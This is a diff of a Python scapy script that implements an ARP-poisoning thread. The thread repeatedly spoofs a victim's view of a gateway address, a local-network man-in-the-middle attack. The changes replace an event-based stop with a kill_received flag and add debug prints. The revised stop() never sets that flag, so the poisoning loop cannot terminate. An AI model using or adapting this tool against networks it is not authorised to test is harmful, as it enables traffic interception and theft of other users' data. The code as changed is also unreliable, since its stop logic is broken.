@@ -1,16 +1,17 @@
 #!/usr/bin/env python
 
 from scapy.all import *
-import threading
+import threading, time
 import sys
 
 class ARPPoisoner(threading.Thread):
     def __init__(self, victimIp = '0.0.0.0', usurpedIp = '192.168.1.1', interface = 'eth0'):
         self.victimIp = victimIp
+        print "init 2"
         self.usurpedIp = usurpedIp
         self.interface = 'eth0'
         threading.Thread.__init__(self)
-        self.__stopped = threading.Event()
+        self.kill_received = False
 
     def __getHwaddr(self, ip):
         resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10, verbose=0)
@@ -41,12 +42,12 @@ class ARPPoisoner(threading.Thread):
             self.victimHwAddr = self.getHwAddrVictim()
         if not self.usurpedHwAddr:
             self.usurpedHwAddr = self.getHwAddrUsurped()
-        while not self.__stopped.isSet():
+        while not self.kill_received:
+            print "exec"
             self.usurp()
-            self.__stopped.wait(1.0)
+            time.sleep(1)
 
     def stop(self):
-        self.__stopped.set()
         self.__restoreNetwork()
 
 if __name__ == '__main__':
